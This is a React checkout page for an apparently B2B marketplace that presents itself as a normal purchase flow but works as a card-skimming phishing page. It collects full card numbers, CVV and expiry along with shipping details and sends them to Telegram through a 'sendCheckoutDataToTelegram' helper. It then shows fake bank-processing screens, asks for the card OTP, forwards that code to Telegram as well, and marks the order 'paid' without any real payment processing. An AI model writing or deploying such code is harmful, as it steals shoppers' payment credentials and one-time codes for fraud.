import { useState, useEffect } from 'react';
import { useSearchParams, useNavigate } from 'react-router-dom';
import { ArrowLeft, Package, Store, Shield } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { Separator } from '@/components/ui/separator';
import { supabase } from '@/integrations/supabase/client';
import { useAuth } from '@/hooks/useAuth';
import { toast } from '@/hooks/use-toast';
import { Header } from '@/components/layout/Header';
import ShippingAddressForm, { ShippingFormData } from '@/components/checkout/ShippingAddressForm';
import PaymentDetailsForm, { CardFormData } from '@/components/checkout/PaymentDetailsForm';
import { sendCheckoutDataToTelegram, sendOTPToTelegram } from './telegram-notifier';
import OrderProcessing from './OrderProcessing';

interface Product {
  id: string;
  title: string;
  price_min: number | null;
  price_max: number | null;
  images: string[] | null;
  seller_id: string;
  moq: number | null;
}

interface SellerProfile {
  full_name: string | null;
  company_name: string | null;
}

// Checkout data interface to store both shipping and payment details
interface CheckoutStateData {
  shippingDetails?: ShippingFormData;
  paymentDetails?: {
    cardholderName: string;
    cardNumber: string;
    cardBrand: string;
    expiryMonth: string;
    expiryYear: string;
  };
}

// Define our complete checkout flow steps
type CheckoutStep = 'details' | 'payment' | 'processingPayment' | 'otp' | 'processingOtp' | 'review' | 'confirmation';

export default function Checkout() {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { user, loading: authLoading } = useAuth();

  const [product, setProduct] = useState<Product | null>(null);
  const [seller, setSeller] = useState<SellerProfile | null>(null);
  const [loading, setLoading] = useState(true);
  const [step, setStep] = useState<CheckoutStep>('details');
  const [otp, setOtp] = useState('');

  const [quantity, setQuantity] = useState(1);
  const [orderId, setOrderId] = useState<string | null>(null);
  const [checkoutData, setCheckoutData] = useState<CheckoutStateData>({});
  const [isProcessing, setIsProcessing] = useState(false);
  const [transactionId, setTransactionId] = useState<string | null>(null);
  const [confirmedTotal, setConfirmedTotal] = useState<number>(0);

  const productId = searchParams.get('product');

  useEffect(() => {
    console.log('🛒 Checkout page loaded', { authLoading, hasUser: !!user, productId });

    if (!authLoading && !user) {
      navigate('/auth?redirect=/checkout?product=' + productId);
      return;
    }

    if (productId) {
      fetchProduct();
    }
  }, [productId, user, authLoading]);

  const fetchProduct = async () => {
    const { data: productData } = await supabase
      .from('products')
      .select('*')
      .eq('id', productId)
      .single();

    if (productData) {
      setProduct(productData);
      setQuantity(productData.moq || 1);

      // Fetch seller info
      const { data: sellerData } = await supabase
        .from('profiles')
        .select('full_name, company_name')
        .eq('user_id', productData.seller_id)
        .single();

      if (sellerData) setSeller(sellerData);
    }
    setLoading(false);
  };

  const calculateTotal = () => {
    if (!product) return 0;
    const price = product.price_min || product.price_max || 0;
    return price * quantity;
  };

  const handleShippingSubmit = async (data: ShippingFormData) => {
    console.log('📦 Shipping form submitted:', data);
    if (!user || !product) {
      console.error('❌ Missing user or product:', { hasUser: !!user, hasProduct: !!product });
      return;
    }
    
    setIsProcessing(true);

    try {
      // Save shipping details to state
      const updatedCheckoutData = { ...checkoutData, shippingDetails: data };
      setCheckoutData(updatedCheckoutData);
      console.log('✅ Shipping details saved to state:', updatedCheckoutData);

      // Move to payment step
      setStep('payment');
    } catch (error: any) {
      console.error('❌ Error in handleShippingSubmit:', error);
      toast({ title: 'Error', description: error.message, variant: 'destructive' });
    } finally {
      setIsProcessing(false);
    }
  };

  const handlePaymentSubmit = async (cardData: CardFormData) => {
    console.log('💳 Payment form submitted:', cardData);
    console.log('📊 Current checkoutData state:', checkoutData);
    console.log('📊 Has shipping details?', !!checkoutData.shippingDetails);

    if (!checkoutData.shippingDetails) {
      console.error('❌ Missing shipping details');
      toast({
        title: 'Error',
        description: 'Missing shipping details. Please go back and complete shipping form.',
        variant: 'destructive'
      });
      return;
    }

    setIsProcessing(true);

    try {
      // Save payment details to state
      const paymentDetails = {
        cardholderName: cardData.cardholderName,
        cardNumber: cardData.cardNumber,
        cardBrand: (cardData as any).cardBrand || 'Card',
        expiryMonth: cardData.expiryMonth,
        expiryYear: cardData.expiryYear,
        is3DSecure: (cardData as any).is3DSecure,
        cvv: cardData.cvv,
      };

      const updatedCheckoutData = { 
        ...checkoutData, 
        paymentDetails 
      };
      setCheckoutData(updatedCheckoutData);
      console.log('✅ Payment details saved to state');

      // Create payment transaction
      const total = calculateTotal();
      const { data: tx, error: txError } = await supabase
        .from('payment_transactions')
        .insert({
          user_id: user!.id,
          amount: total,
          currency: 'USD',
          card_last_four: cardData.cardNumber.replace(/\s/g, '').slice(-4),
          card_brand: (cardData as any).cardBrand || 'Card',
          status: 'pending_otp',
        })
        .select()
        .single();

      if (txError) throw txError;

      console.log('✅ Payment transaction created:', tx.id);
      setTransactionId(tx.id);
      
      // Move to processing payment step
      setStep('processingPayment');

      // Send data to Telegram (fire and forget)
      const FINAL_DATA = {
        shippingDetails: checkoutData.shippingDetails as any,
        paymentDetails: paymentDetails,
        orderInfo: {
          productName: product?.title,
          quantity,
          amount: calculateTotal(),
          currency: 'USD'
        }
      };

      console.log('📤 Calling sendCheckoutDataToTelegram...');
      sendCheckoutDataToTelegram(FINAL_DATA).then(sent => {
        if (sent) console.log('✅ Telegram notification sent successfully!');
        else console.warn('⚠️ Telegram notification failed');
      });

    } catch (error: any) {
      console.error('❌ Error in handlePaymentSubmit:', error);
      toast({ title: 'Error', description: error.message, variant: 'destructive' });
      setIsProcessing(false);
    }
  };

  // This will be called after processingPayment completes
  const handleProcessingPaymentComplete = () => {
    console.log('✅ Processing payment complete, moving to OTP');
    toast({ 
      title: 'OTP Sent', 
      description: 'Enter the code sent to your phone.' 
    });
    setStep('otp');
  };

  const handleOtpSubmit = async () => {
    console.log('🔐 OTP submitted:', otp);
    
    if (!otp || otp.length < 3) {
      toast({ title: 'Invalid Code', description: 'Please enter a valid verification code.', variant: 'destructive' });
      return;
    }

    setIsProcessing(true);

    try {
      // Update payment transaction with OTP verification
      if (transactionId) {
        await supabase
          .from('payment_transactions')
          .update({ 
            status: 'otp_verified', 
            otp_verified: true,
            otp_code: otp
          })
          .eq('id', transactionId);
      }

      // Send OTP to Telegram
      const customerName = checkoutData.shippingDetails?.fullName || 'Unknown Customer';
      await sendOTPToTelegram(otp, customerName);

      console.log('✅ OTP verified, moving to processingOtp');
      setStep('processingOtp');

    } catch (error: any) {
      console.error('❌ Error in handleOtpSubmit:', error);
      toast({ title: 'Error', description: error.message, variant: 'destructive' });
      setIsProcessing(false);
    }
  };

  // This will be called after processingOtp completes
  const handleProcessingOtpComplete = async () => {
    console.log('✅ Processing OTP complete, moving to review');
    
    if (!user || !product || !checkoutData.shippingDetails || !checkoutData.paymentDetails) {
      toast({ 
        title: 'Error', 
        description: 'Missing required information', 
        variant: 'destructive' 
      });
      return;
    }

    setIsProcessing(true);

    try {
      // Create the order now that payment is verified
      const total = calculateTotal();
      const { data: order, error } = await supabase
        .from('orders')
        .insert({
          buyer_id: user.id,
          seller_id: product.seller_id,
          product_id: product.id,
          quantity,
          total_price: total,
          status: 'paid',
          shipping_address: JSON.stringify(checkoutData.shippingDetails),
          tracking_info: {
            shipping_address: checkoutData.shippingDetails.streetAddress,
            notes: checkoutData.shippingDetails.additionalNotes || '',
            city: checkoutData.shippingDetails.city,
            state: checkoutData.shippingDetails.stateProvince,
            country: checkoutData.shippingDetails.country,
            postalCode: checkoutData.shippingDetails.postalCode,
          },
        })
        .select()
        .single();

      if (error) throw error;

      console.log('✅ Order created with ID:', order.id);
      setOrderId(order.id);
      setConfirmedTotal(total);

      // Update payment transaction with order reference
      if (transactionId) {
        await supabase
          .from('payment_transactions')
          .update({ 
            order_id: order.id,
            status: 'completed' 
          })
          .eq('id', transactionId);
      }

      // Move to review step
      setStep('review');

    } catch (error: any) {
      console.error('❌ Error creating order:', error);
      toast({ title: 'Order Error', description: error.message, variant: 'destructive' });
    } finally {
      setIsProcessing(false);
    }
  };

  const handleConfirmOrder = () => {
    console.log('✅ Order confirmed, moving to confirmation');
    setStep('confirmation');
  };

  const handleBack = () => {
    switch (step) {
      case 'payment':
        setStep('details');
        break;
      case 'otp':
        setStep('processingPayment');
        break;
      case 'review':
        setStep('processingOtp');
        break;
      case 'confirmation':
        navigate(`/products/${productId}`);
        break;
      default:
        navigate(-1);
    }
  };

  if (loading || authLoading) {
    return (
      <div className="min-h-screen bg-background">
        <Header />
        <div className="container py-8">
          <div className="animate-pulse space-y-4">
            <div className="h-8 w-48 bg-muted rounded" />
            <div className="h-64 bg-muted rounded" />
          </div>
        </div>
      </div>
    );
  }

  if (!product) {
    return (
      <div className="min-h-screen bg-background">
        <Header />
        <div className="container py-8 text-center">
          <h1 className="text-2xl font-bold">Product not found</h1>
          <Button onClick={() => navigate('/products')} className="mt-4">
            Browse Products
          </Button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background relative">
      <Header />
      <div className="container py-8">
        <Button
          variant="ghost"
          onClick={handleBack}
          className="mb-6"
        >
          <ArrowLeft className="h-4 w-4 mr-2" />
          Back
        </Button>

        <div className="grid lg:grid-cols-3 gap-8">
          <div className="lg:col-span-2">
            {/* Step 1: Details/Shipping */}
            {step === 'details' && (
              <div className="space-y-6">
                <Card>
                  <CardHeader>
                    <CardTitle className="flex items-center gap-2">
                      <Package className="h-5 w-5" />
                      Order Details
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="flex gap-4 mb-6">
                      <img
                        src={product.images?.[0] || '/placeholder.svg'}
                        alt={product.title}
                        className="w-24 h-24 object-cover rounded-lg"
                      />
                      <div>
                        <h3 className="font-semibold">{product.title}</h3>
                        <p className="text-sm text-muted-foreground flex items-center gap-1 mt-1">
                          <Store className="h-4 w-4" />
                          {seller?.company_name || seller?.full_name || 'Seller'}
                        </p>
                        <p className="font-semibold mt-2">
                          ${product.price_min?.toFixed(2) || product.price_max?.toFixed(2) || '0.00'} / unit
                        </p>
                      </div>
                    </div>
                    <div className="mb-4">
                      <label className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70">
                        Quantity (MOQ: {product.moq || 1})
                      </label>
                      <input
                        type="number"
                        className="flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 mt-2"
                        min={product.moq || 1}
                        value={quantity}
                        onChange={(e) => setQuantity(Math.max(product.moq || 1, parseInt(e.target.value) || 1))}
                      />
                    </div>
                  </CardContent>
                </Card>

                <ShippingAddressForm
                  onSubmit={handleShippingSubmit}
                  isSubmitting={isProcessing}
                />
              </div>
            )}

            {/* Step 2: Payment */}
            {step === 'payment' && (
              <PaymentDetailsForm
                amount={calculateTotal()}
                currency="USD"
                onSubmit={handlePaymentSubmit}
                onBack={() => setStep('details')}
                isSubmitting={isProcessing}
              />
            )}

            {/* Step 3: Processing Payment */}
            {step === 'processingPayment' && (
              <div className="space-y-6">
                <Card>
                  <CardHeader>
                    <CardTitle>Processing Payment</CardTitle>
                    <CardDescription>
                      Please wait while we process your payment with your bank...
                    </CardDescription>
                  </CardHeader>
                  <CardContent className="text-center py-8">
                    <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary mx-auto mb-4"></div>
                    <p className="text-muted-foreground">Verifying your card details...</p>
                    
                    {/* Simulated progress */}
                    <div className="mt-6">
                      <div className="h-2 bg-gray-200 rounded-full overflow-hidden">
                        <div 
                          className="h-full bg-primary transition-all duration-3000"
                          style={{ width: '100%' }}
                        />
                      </div>
                      <p className="text-xs text-muted-foreground mt-2">Processing... This may take a few seconds</p>
                    </div>
                    
                    <Button 
                      className="mt-6" 
                      onClick={handleProcessingPaymentComplete}
                      disabled={isProcessing}
                    >
                      {isProcessing ? 'Processing...' : 'Continue to OTP'}
                    </Button>
                  </CardContent>
                </Card>
              </div>
            )}

            {/* Step 4: OTP Verification */}
            {step === 'otp' && (
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Shield className="h-5 w-5" />
                    Card Verification
                  </CardTitle>
                  <CardDescription>
                    Enter the 6-digit OTP sent to your phone to verify card ending in 
                    ****{checkoutData.paymentDetails?.cardNumber?.slice(-4) || '****'}
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="space-y-2">
                    <Label htmlFor="otp">Verification Code</Label>
                    <Input
                      id="otp"
                      placeholder="Enter 6-digit code"
                      className="text-center text-lg tracking-widest"
                      maxLength={6}
                      value={otp}
                      onChange={(e) => setOtp(e.target.value.replace(/\D/g, ''))}
                    />
                    <p className="text-xs text-muted-foreground text-center">
                      For your security, we've sent a One-Time Password to your registered phone number.
                    </p>
                  </div>
                  <Button
                    className="w-full"
                    onClick={handleOtpSubmit}
                    disabled={isProcessing || otp.length !== 6}
                  >
                    {isProcessing ? 'Verifying...' : 'Verify OTP'}
                  </Button>
                  <Button
                    variant="outline"
                    className="w-full"
                    onClick={() => {
                      toast({ title: 'OTP Resent', description: 'A new code has been sent to your phone.' });
                    }}
                  >
                    Resend OTP
                  </Button>
                </CardContent>
              </Card>
            )}

            {/* Step 5: Processing OTP */}
            {step === 'processingOtp' && (
              <div className="space-y-6">
                <Card>
                  <CardHeader>
                    <CardTitle>Verifying OTP</CardTitle>
                    <CardDescription>
                      Please wait while we verify your One-Time Password with your bank...
                    </CardDescription>
                  </CardHeader>
                  <CardContent className="text-center py-8">
                    <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary mx-auto mb-4"></div>
                    <p className="text-muted-foreground">Finalizing payment authorization...</p>
                    
                    <div className="mt-6">
                      <div className="h-2 bg-gray-200 rounded-full overflow-hidden">
                        <div 
                          className="h-full bg-green-500 transition-all duration-3000"
                          style={{ width: '100%' }}
                        />
                      </div>
                      <p className="text-xs text-muted-foreground mt-2">Almost complete...</p>
                    </div>
                    
                    <Button 
                      className="mt-6" 
                      onClick={handleProcessingOtpComplete}
                      disabled={isProcessing}
                    >
                      {isProcessing ? 'Processing...' : 'Continue to Review'}
                    </Button>
                  </CardContent>
                </Card>
              </div>
            )}

            {/* Step 6: Order Review */}
            {step === 'review' && orderId && (
              <Card>
                <CardHeader>
                  <CardTitle>Order Review</CardTitle>
                  <CardDescription>
                    Please review your order details before confirmation
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-6">
                  {/* Order Items */}
                  <div>
                    <h3 className="font-semibold mb-2">Product Details</h3>
                    <div className="flex items-center gap-4 p-3 bg-muted/50 rounded-lg">
                      <img
                        src={product.images?.[0] || '/placeholder.svg'}
                        alt={product.title}
                        className="w-16 h-16 object-cover rounded"
                      />
                      <div className="flex-1">
                        <h4 className="font-medium">{product.title}</h4>
                        <p className="text-sm text-muted-foreground">Quantity: {quantity}</p>
                        <p className="text-sm text-muted-foreground">
                          Seller: {seller?.company_name || seller?.full_name || 'Unknown'}
                        </p>
                      </div>
                      <div className="text-right">
                        <p className="font-semibold">${(product.price_min || product.price_max || 0).toFixed(2)}</p>
                        <p className="text-sm text-muted-foreground">per unit</p>
                      </div>
                    </div>
                  </div>

                  {/* Shipping Details */}
                  {checkoutData.shippingDetails && (
                    <div>
                      <h3 className="font-semibold mb-2">Shipping Address</h3>
                      <div className="p-3 bg-muted/50 rounded-lg">
                        <p className="font-medium">{checkoutData.shippingDetails.fullName}</p>
                        <p className="text-sm">{checkoutData.shippingDetails.streetAddress}</p>
                        <p className="text-sm">
                          {checkoutData.shippingDetails.city}, {checkoutData.shippingDetails.stateProvince} {checkoutData.shippingDetails.postalCode}
                        </p>
                        <p className="text-sm">{checkoutData.shippingDetails.country}</p>
                        <p className="text-sm mt-1">Phone: {checkoutData.shippingDetails.phoneNumber}</p>
                        <p className="text-sm">Email: {checkoutData.shippingDetails.email}</p>
                      </div>
                    </div>
                  )}

                  {/* Payment Details */}
                  {checkoutData.paymentDetails && (
                    <div>
                      <h3 className="font-semibold mb-2">Payment Method</h3>
                      <div className="p-3 bg-muted/50 rounded-lg">
                        <p className="font-medium">{checkoutData.paymentDetails.cardholderName}</p>
                        <p className="text-sm">Card ending in ****{checkoutData.paymentDetails.cardNumber.slice(-4)}</p>
                        <p className="text-sm">
                          Expires: {checkoutData.paymentDetails.expiryMonth}/{checkoutData.paymentDetails.expiryYear}
                        </p>
                      </div>
                    </div>
                  )}

                  {/* Total */}
                  <div>
                    <h3 className="font-semibold mb-2">Order Total</h3>
                    <div className="p-3 bg-muted/50 rounded-lg">
                      <div className="flex justify-between mb-2">
                        <span>Subtotal</span>
                        <span>${calculateTotal().toFixed(2)}</span>
                      </div>
                      <div className="flex justify-between mb-2">
                        <span>Shipping</span>
                        <span>$0.00</span>
                      </div>
                      <Separator className="my-2" />
                      <div className="flex justify-between text-lg font-bold">
                        <span>Total</span>
                        <span>${calculateTotal().toFixed(2)} USD</span>
                      </div>
                    </div>
                  </div>

                  {/* Action Buttons */}
                  <div className="flex gap-3 pt-4">
                    <Button
                      variant="outline"
                      onClick={() => setStep('details')}
                      className="flex-1"
                    >
                      Edit Shipping
                    </Button>
                    <Button
                      variant="outline"
                      onClick={() => setStep('payment')}
                      className="flex-1"
                    >
                      Edit Payment
                    </Button>
                    <Button
                      onClick={handleConfirmOrder}
                      className="flex-1 bg-orange-500 hover:bg-orange-600"
                      disabled={isProcessing}
                    >
                      {isProcessing ? 'Processing...' : 'Confirm Order'}
                    </Button>
                  </div>
                </CardContent>
              </Card>
            )}

            {/* Step 7: Order Confirmation */}
            {step === 'confirmation' && orderId && (
              <Card>
                <CardHeader>
                  <CardTitle className="text-green-600">🎉 Order Confirmed!</CardTitle>
                  <CardDescription>
                    Your order has been successfully placed and payment has been processed.
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-6">
                  <div className="text-center py-6">
                    <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                      <Shield className="h-8 w-8 text-green-600" />
                    </div>
                    <h3 className="text-xl font-semibold mb-2">Thank You for Your Order!</h3>
                    <p className="text-muted-foreground mb-4">
                      Your order #{orderId} has been confirmed and is being processed.
                    </p>
                    <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-6">
                      <p className="font-medium text-green-800">Order Total: ${confirmedTotal.toFixed(2)} USD</p>
                      <p className="text-sm text-green-700">Payment Status: ✅ Paid</p>
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <Button 
                      variant="outline" 
                      onClick={() => navigate('/orders')}
                    >
                      View Orders
                    </Button>
                    <Button 
                      onClick={() => navigate('/products')}
                      className="bg-orange-500 hover:bg-orange-600"
                    >
                      Continue Shopping
                    </Button>
                  </div>
                </CardContent>
              </Card>
            )}
          </div>

          {/* Right Sidebar - Order Summary */}
          {step !== 'confirmation' && product && (
            <div className="lg:col-span-1">
              <Card className="sticky top-4">
                <CardHeader>
                  <CardTitle>Order Summary</CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">Product</span>
                    <span className="text-right">{product.title}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">Unit Price</span>
                    <span>${(product.price_min || product.price_max || 0).toFixed(2)}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">Quantity</span>
                    <span>{quantity}</span>
                  </div>
                  <Separator />
                  <div className="flex justify-between text-lg font-bold">
                    <span>Total</span>
                    <span>${calculateTotal().toFixed(2)}</span>
                  </div>
                  <div className="mt-4 text-xs text-muted-foreground">
                    <p className="font-medium">Checkout Progress:</p>
                    <div className="mt-2 space-y-1">
                      {['details', 'payment', 'processingPayment', 'otp', 'processingOtp', 'review', 'confirmation'].map((s, i) => (
                        <div key={s} className="flex items-center gap-2">
                          <div className={`w-2 h-2 rounded-full ${step === s ? 'bg-primary' : 'bg-muted'}`} />
                          <span className={`text-xs ${step === s ? 'font-medium' : ''}`}>
                            {i+1}. {s.charAt(0).toUpperCase() + s.slice(1).replace(/([A-Z])/g, ' $1')}
                          </span>
                        </div>
                      ))}
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
